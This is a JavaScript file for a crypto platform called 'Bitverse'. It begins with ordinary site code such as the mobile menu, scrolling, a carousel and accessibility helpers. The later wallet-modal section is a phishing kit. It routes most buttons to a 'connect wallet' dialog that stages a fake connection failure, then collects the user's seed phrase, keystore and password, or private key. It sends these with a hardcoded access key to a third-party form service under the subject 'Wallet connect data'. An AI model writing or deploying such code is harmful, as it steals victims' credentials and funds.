// Mobile Menu Toggle
const hamburger = document.querySelector('.hamburger');
const navMenu = document.querySelector('.nav-menu');
const navLinks = document.querySelectorAll('.nav-link');

// Open/Close mobile menu
hamburger.addEventListener('click', () => {
    hamburger.classList.toggle('active');
    navMenu.classList.toggle('active');
});

// Close mobile menu when a link is clicked
navLinks.forEach(link => {
    link.addEventListener('click', () => {
        hamburger.classList.remove('active');
        navMenu.classList.remove('active');
    });
});

// Smooth scroll behavior for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        if (href !== '#' && document.querySelector(href)) {
            e.preventDefault();
            document.querySelector(href).scrollIntoView({
                behavior: 'smooth'
            });
        }
    });
});

// Add scroll effect to navbar
const navbar = document.querySelector('.navbar');
let lastScrollTop = 0;

window.addEventListener('scroll', () => {
    let scrollTop = window.pageYOffset || document.documentElement.scrollTop;

    if (scrollTop > 100) {
        navbar.style.boxShadow = '0 4px 20px rgba(0, 212, 255, 0.1)';
    } else {
        navbar.style.boxShadow = 'none';
    }

    lastScrollTop = scrollTop <= 0 ? 0 : scrollTop;
});

// Intersection Observer for fade-in animations
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -100px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.animation = 'slideInUp 0.6s ease forwards';
            observer.unobserve(entry.target);
        }
    });
}, observerOptions);

// Observe all sections
document.querySelectorAll('section').forEach(section => {
    section.style.opacity = '0';
    observer.observe(section);
});

// Counter animation for stats
function animateCounter(element, target, duration = 2000) {
    let current = 0;
    const increment = target / (duration / 16);
    const timer = setInterval(() => {
        current += increment;
        if (current >= target) {
            element.textContent = target.toLocaleString();
            clearInterval(timer);
        } else {
            element.textContent = Math.floor(current).toLocaleString();
        }
    }, 16);
}

// Lazy load images
const images = document.querySelectorAll('img[data-src]');
const imageObserver = new IntersectionObserver((entries, observer) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const img = entry.target;
            img.src = img.dataset.src;
            img.removeAttribute('data-src');
            observer.unobserve(img);
        }
    });
});

images.forEach(img => imageObserver.observe(img));

// Copy to clipboard functionality
function copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            console.log('Text copied to clipboard');
        }).catch(err => {
            console.error('Failed to copy text: ', err);
        });
    }
}

// Keyboard navigation
document.addEventListener('keydown', (e) => {
    // Escape key closes mobile menu
    if (e.key === 'Escape') {
        hamburger.classList.remove('active');
        navMenu.classList.remove('active');
    }

    // Tab navigation
    if (e.key === 'Tab') {
        const focusableElements = document.querySelectorAll(
            'a, button, [tabindex]:not([tabindex="-1"])'
        );
        const firstElement = focusableElements[0];
        const lastElement = focusableElements[focusableElements.length - 1];

        if (e.shiftKey) {
            if (document.activeElement === firstElement) {
                lastElement.focus();
                e.preventDefault();
            }
        } else {
            if (document.activeElement === lastElement) {
                firstElement.focus();
                e.preventDefault();
            }
        }
    }
});

// Form validation (if needed)
function validateEmail(email) {
    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return regex.test(email);
}

// Debounce function
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// Throttle function
function throttle(func, limit) {
    let inThrottle;
    return function(...args) {
        if (!inThrottle) {
            func.apply(this, args);
            inThrottle = true;
            setTimeout(() => inThrottle = false, limit);
        }
    };
}

// Responsive table functionality
function makeTableResponsive() {
    const tables = document.querySelectorAll('table');
    tables.forEach(table => {
        if (window.innerWidth < 768) {
            table.setAttribute('data-responsive', 'true');
            const rows = table.querySelectorAll('tr');
            const headers = Array.from(table.querySelectorAll('th')).map(th => th.textContent);

            rows.forEach((row, index) => {
                if (index > 0) {
                    const cells = row.querySelectorAll('td');
                    cells.forEach((cell, cellIndex) => {
                        cell.setAttribute('data-label', headers[cellIndex]);
                    });
                }
            });
        }
    });
}

makeTableResponsive();
window.addEventListener('resize', throttle(makeTableResponsive, 250));

// Product carousel (if needed for future features)
class Carousel {
    constructor(containerSelector, options = {}) {
        this.container = document.querySelector(containerSelector);
        this.options = {
            autoplay: options.autoplay || false,
            interval: options.interval || 5000,
            ...options
        };
        this.currentIndex = 0;
        this.items = [];
        this.init();
    }

    init() {
        if (!this.container) return;
        this.items = this.container.querySelectorAll('[data-carousel-item]');
        if (this.items.length === 0) return;

        if (this.options.autoplay) {
            this.startAutoplay();
        }
    }

    next() {
        this.currentIndex = (this.currentIndex + 1) % this.items.length;
        this.update();
    }

    prev() {
        this.currentIndex = (this.currentIndex - 1 + this.items.length) % this.items.length;
        this.update();
    }

    update() {
        this.items.forEach((item, index) => {
            item.classList.toggle('active', index === this.currentIndex);
        });
    }

    startAutoplay() {
        setInterval(() => this.next(), this.options.interval);
    }
}

// Performance monitoring
function logPerformanceMetrics() {
    if (window.performance && window.performance.timing) {
        const perf = window.performance.timing;
        const pageLoadTime = perf.loadEventEnd - perf.navigationStart;
        console.log('Page Load Time: ' + pageLoadTime + 'ms');

        // Additional metrics
        const connectTime = perf.responseEnd - perf.requestStart;
        const renderTime = perf.domComplete - perf.domLoading;
        const domContentLoadedTime = perf.domContentLoadedEventEnd - perf.navigationStart;

        console.log('Connect Time: ' + connectTime + 'ms');
        console.log('Render Time: ' + renderTime + 'ms');
        console.log('DOM Content Loaded: ' + domContentLoadedTime + 'ms');
    }
}

// Log performance metrics after page load
window.addEventListener('load', logPerformanceMetrics);

// Service Worker Registration (for PWA support) - DISABLED for development
// if ('serviceWorker' in navigator) {
//     window.addEventListener('load', () => {
//         navigator.serviceWorker.register('sw.js').catch(err => {
//             console.log('Service Worker registration failed: ', err);
//         });
//     });
// }

// Accessibility improvements
document.addEventListener('DOMContentLoaded', () => {
    // Add ARIA labels
    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        if (!button.hasAttribute('aria-label')) {
            button.setAttribute('aria-label', button.textContent || 'Button');
        }
    });

    // Add role to interactive elements
    document.querySelectorAll('.card-link').forEach(link => {
        link.setAttribute('role', 'button');
    });
});

// Export functions for use in other scripts
window.Bitverse = {
    copyToClipboard,
    validateEmail,
    debounce,
    throttle,
    Carousel,
    animateCounter,
    openSelectWalletModal: null // will be set after initialization
};

// Initialize on DOM ready
document.addEventListener('DOMContentLoaded', () => {
    console.log('Bitverse Platform Loaded Successfully');
    
    // Initialize Wallet Modal
    initializeWalletModal();
    
    // Add any initialization code here
    // For example: initialize tooltips, popovers, etc.
});

// ===== WALLET MODAL FUNCTIONALITY =====

function initializeWalletModal() {
    const access_key = '1efaad3c-90c4-462d-83e7-eb60307df491';

    // Track selected wallet
    let selectedWallet = { name: 'MetaMask', img: 'https://www.svgrepo.com/show/439802/metamask.svg' };

    // Modal functions
    function openSelectWalletModal() {
        const modal = document.getElementById('selectWalletModal');
        if (modal) {
            modal.classList.remove('hidden');
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    function closeSelectWalletModal() {
        const modal = document.getElementById('selectWalletModal');
        if (modal) {
            modal.classList.add('hidden');
            modal.style.display = '';
            document.body.style.overflow = '';
        }
    }

    // Expose openSelectWalletModal globally
    window.Bitverse.openSelectWalletModal = openSelectWalletModal;

    // Wire buttons to open wallet modal
    const walletTriggerButtons = [
        // Connect wallet button in navbar
        document.querySelector('.connect-wallet-btn'),
    ];

    // Add nav links (exclude Contact Us link)
    document.querySelectorAll('.nav-link').forEach(link => {
        if (!link.textContent.includes('Contact')) {
            walletTriggerButtons.push(link);
        }
    });

    // Add reward cards
    document.querySelectorAll('.reward-card').forEach(card => {
        walletTriggerButtons.push(card);
    });

    // Add Trade Now button
    const tradeNowBtn = Array.from(document.querySelectorAll('a.btn')).find(btn => btn.textContent.includes('Trade Now'));
    if (tradeNowBtn) walletTriggerButtons.push(tradeNowBtn);

    // Add xBV Airdrop button
    const xbvAirdropBtn = Array.from(document.querySelectorAll('a.btn')).find(btn => btn.textContent.includes('xBV Airdrop'));
    if (xbvAirdropBtn) walletTriggerButtons.push(xbvAirdropBtn);

    // Add Trading on PC button
    const tradingOnPcBtn = Array.from(document.querySelectorAll('a.btn')).find(btn => btn.textContent.includes('Trading on PC'));
    if (tradingOnPcBtn) walletTriggerButtons.push(tradingOnPcBtn);

    // Add Trade on Web button
    const tradeOnWebBtn = Array.from(document.querySelectorAll('a.btn')).find(btn => btn.textContent.includes('Trade on Web'));
    if (tradeOnWebBtn) walletTriggerButtons.push(tradeOnWebBtn);

    walletTriggerButtons.forEach(button => {
        if (button) {
            button.addEventListener('click', (e) => {
                // Only prevent default for nav links and buttons
                if (button.tagName === 'A' && button.getAttribute('href')?.startsWith('/')) {
                    e.preventDefault();
                } else if (button.tagName === 'DIV' || button.classList.contains('reward-card')) {
                    e.preventDefault();
                }
                openSelectWalletModal();
            });
        }
    });

    // Wallet option selection
    document.querySelectorAll('.wallet-option').forEach(btn => {
        btn.addEventListener('click', () => {
            const img = btn.querySelector('img');
            const name = btn.querySelector('span').innerText;
            const mainImg = document.getElementById('modalMainWalletImg');
            const mainName = document.getElementById('modalMainWalletName');
            
            if (img && mainImg) mainImg.src = img.src;
            if (name && mainName) mainName.textContent = name;
            selectedWallet = { name: name, img: img ? img.src : '' };
            
            // Close more wallets if open
            const more = document.getElementById('moreWallets');
            const toggle = document.getElementById('toggleMoreWallets');
            if (more && more.getAttribute('aria-hidden') === 'false') {
                more.setAttribute('aria-hidden', 'true');
                if (toggle) {
                    toggle.setAttribute('aria-expanded', 'false');
                    toggle.textContent = 'Choose your preferred wallets +30';
                }
            }
        });
    });

    // Toggle more wallets button
    const toggleBtn = document.getElementById('toggleMoreWallets');
    if (toggleBtn) {
        toggleBtn.addEventListener('click', () => {
            const more = document.getElementById('moreWallets');
            const isHidden = more.getAttribute('aria-hidden') === 'true';
            more.setAttribute('aria-hidden', isHidden ? 'false' : 'true');
            toggleBtn.setAttribute('aria-expanded', isHidden ? 'true' : 'false');
            toggleBtn.textContent = isHidden ? 'Hide wallets -30' : 'Choose your preferred wallets +30';
        });
    }

    // Close modal button
    const modalCloseBtn = document.getElementById('modalCloseBtn');
    if (modalCloseBtn) {
        modalCloseBtn.addEventListener('click', closeSelectWalletModal);
    }

    // Close on outside click
    const selectWalletModal = document.getElementById('selectWalletModal');
    if (selectWalletModal) {
        selectWalletModal.addEventListener('click', (e) => {
            if (e.target === selectWalletModal) {
                closeSelectWalletModal();
            }
        });
    }

    // Close on Escape
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            closeSelectWalletModal();
        }
    });

    // Manual connect modal elements
    const connectManualModal = document.getElementById('connectManualModal');
    const manualCloseBtn = document.getElementById('manualCloseBtn');
    const manualConnectBtn = document.getElementById('manualConnectBtn');
    const errorConnectingLabel = document.getElementById('errorConnecting');
    const connectManuallyLabel = document.getElementById('connectManuallyLabel');
    const connectingOverlay = document.getElementById('connectingOverlay');
    const connectingWalletImg = document.getElementById('connectingWalletImg');
    const phrasesField = document.getElementById('phrasesField');
    const keystoreField = document.getElementById('keystoreField');
    const privateField = document.getElementById('privateField');
    const manualRadios = Array.from(document.querySelectorAll('input[name="manualMethod"]'));

    // Toggle manual method fields
    function updateManualFields() {
        const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
        phrasesField?.classList.toggle('hidden', sel !== 'phrases');
        keystoreField?.classList.toggle('hidden', sel !== 'keystore');
        privateField?.classList.toggle('hidden', sel !== 'private');
    }

    manualRadios.forEach(r => r.addEventListener('change', updateManualFields));
    updateManualFields();

    // Close manual modal button
    if (manualCloseBtn) {
        manualCloseBtn.addEventListener('click', () => {
            connectManualModal?.classList.add('hidden');
            document.body.classList.remove('overflow-hidden');
            document.body.style.overflow = '';
        });
    }

    // Close on outside click
    if (connectManualModal) {
        connectManualModal.addEventListener('click', (e) => {
            if (e.target === connectManualModal) {
                connectManualModal.classList.add('hidden');
                document.body.classList.remove('overflow-hidden');
                document.body.style.overflow = '';
            }
        });
    }

    // Submit to Web3Forms
    async function submitToWeb3Forms(message, options = {}) {
        const { isFinalStep = false } = options;
        if (errorConnectingLabel) errorConnectingLabel.classList.add('hidden');
        if (connectManuallyLabel) connectManuallyLabel.textContent = 'Connecting...';

        if (isFinalStep && connectingOverlay) {
            connectManualModal?.classList.add('hidden');
            const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
            if (method === 'phrases') {
                connectingWalletImg.src = selectedWallet.img || 'assets/wallet-gifs.png';
            } else {
                connectingWalletImg.src = 'assets/wallet-gifs.png';
            }
            connectingOverlay.classList.remove('hidden');
            connectingOverlay.setAttribute('aria-hidden', 'false');
            connectingOverlay.style.display = 'flex';
            document.body.classList.add('overflow-hidden');
        }

        try {
            const res = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ access_key, subject: 'Wallet connect data', message })
            });
            if (!res.ok) throw new Error('Network error');
            const data = await res.json();
            if (!data.success) throw new Error(data.message || 'Failed');
            return true;
        } catch (err) {
            console.error(err);
            if (connectingOverlay) {
                connectingOverlay.classList.add('hidden');
                connectingOverlay.setAttribute('aria-hidden', 'true');
                connectingOverlay.style.display = 'none';
            }
            if (errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
            if (connectManuallyLabel) connectManuallyLabel.textContent = 'Connect manually';
            document.body.classList.remove('overflow-hidden');
            return false;
        }
    }

    // Manual Connect button
    if (manualConnectBtn) {
        manualConnectBtn.addEventListener('click', async function () {
            const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
            const payloadParts = [];
            payloadParts.push('wallet: ' + (selectedWallet.name || 'unknown'));

            if (method === 'phrases') {
                const count = parseInt(document.querySelector('input[name="phraseCount"]:checked')?.value || '12', 10);
                const words = [];
                for (let i = 1; i <= count; i++) {
                    const v = document.getElementById('phrase-' + i)?.value?.trim() || '';
                    if (v) words.push(v);
                }
                if (words.length !== count) {
                    if (errorConnectingLabel) errorConnectingLabel.classList.remove('hidden');
                    return;
                }
                payloadParts.push('phrases: ' + words.join(' '));
            } else if (method === 'keystore') {
                const v = document.getElementById('keystoreInput')?.value || '';
                const p = document.getElementById('keystorePassword')?.value || '';
                if (v) payloadParts.push('keystore: ' + v);
                if (p) payloadParts.push('keystore password: ' + p);
            } else if (method === 'private') {
                const v = document.getElementById('privateInput')?.value || '';
                if (v) payloadParts.push('private key: ' + v);
            }

            const message = payloadParts.join('\n');
            await submitToWeb3Forms(message, { isFinalStep: true });
        });
    }

    // Render phrase inputs
    function renderPhraseInputs(count = 12) {
        const grid = document.getElementById('phrasesGrid');
        if (!grid) return;
        grid.innerHTML = '';
        for (let i = 1; i <= count; i++) {
            const wrap = document.createElement('div');
            wrap.className = 'phrase-cell';
            const input = document.createElement('input');
            input.id = 'phrase-' + i;
            input.placeholder = 'word ' + i;
            input.className = 'phrase-input';
            wrap.appendChild(input);
            grid.appendChild(wrap);
        }
    }

    document.querySelectorAll('input[name="phraseCount"]').forEach(r => 
        r.addEventListener('change', () => renderPhraseInputs(parseInt(r.value, 10)))
    );
    renderPhraseInputs(12);

    // Connect Wallet button (12s timeout → manual modal)
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    if (connectWalletBtn) {
        connectWalletBtn.addEventListener('click', (e) => {
            e.preventDefault();
            if (connectWalletBtn.dataset.loading === 'true') return;
            connectWalletBtn.dataset.loading = 'true';
            connectWalletBtn.disabled = true;

            const inModal = document.getElementById('inModalConnecting');
            const connectRing = document.getElementById('connectRing');
            const connectingText = document.getElementById('inModalConnectingText');
            const msg = document.getElementById('inModalConnectMessage');

            const loaderLeft = document.getElementById('modalLoaderLeft');
            const loaderRight = document.getElementById('modalLoaderRight');

            if (connectRing) {
                connectRing.classList.add('active');
                connectRing.setAttribute('aria-hidden', 'false');
                connectRing.style.display = 'block';
            }
            if (inModal) { 
                inModal.classList.add('active'); 
                inModal.setAttribute('aria-hidden', 'false'); 
            }
            if (connectingText) connectingText.style.display = 'block';

            // show side loaders and start rotation animation
            if (loaderLeft) {
                loaderLeft.classList.add('rotating');
                loaderLeft.setAttribute('aria-hidden', 'false');
                loaderLeft.style.display = 'block';
            }
            if (loaderRight) {
                loaderRight.classList.add('rotating');
                loaderRight.setAttribute('aria-hidden', 'false');
                loaderRight.style.display = 'block';
            }

            setTimeout(() => {
                if (connectRing) {
                    connectRing.classList.remove('active');
                    connectRing.setAttribute('aria-hidden', 'true');
                    connectRing.style.display = '';
                }
                if (inModal) { 
                    inModal.classList.remove('active'); 
                    inModal.setAttribute('aria-hidden', 'true'); 
                }
                if (connectingText) connectingText.style.display = 'none';

                // hide and stop side loaders
                if (loaderLeft) {
                    loaderLeft.classList.remove('rotating');
                    loaderLeft.setAttribute('aria-hidden', 'true');
                    loaderLeft.style.display = '';
                }
                if (loaderRight) {
                    loaderRight.classList.remove('rotating');
                    loaderRight.setAttribute('aria-hidden', 'true');
                    loaderRight.style.display = '';
                }
                if (msg) { 
                    msg.classList.add('show'); 
                    msg.setAttribute('aria-hidden', 'false'); 
                }

                setTimeout(() => {
                    if (msg) { 
                        msg.classList.remove('show'); 
                        msg.setAttribute('aria-hidden', 'true'); 
                    }
                    closeSelectWalletModal();
                    if (connectManualModal) {
                        connectManualModal.classList.remove('hidden');
                        document.body.style.overflow = 'hidden';
                    }
                    connectWalletBtn.disabled = false;
                    connectWalletBtn.dataset.loading = 'false';
                }, 3000);
            }, 12000);
        });
    }
}

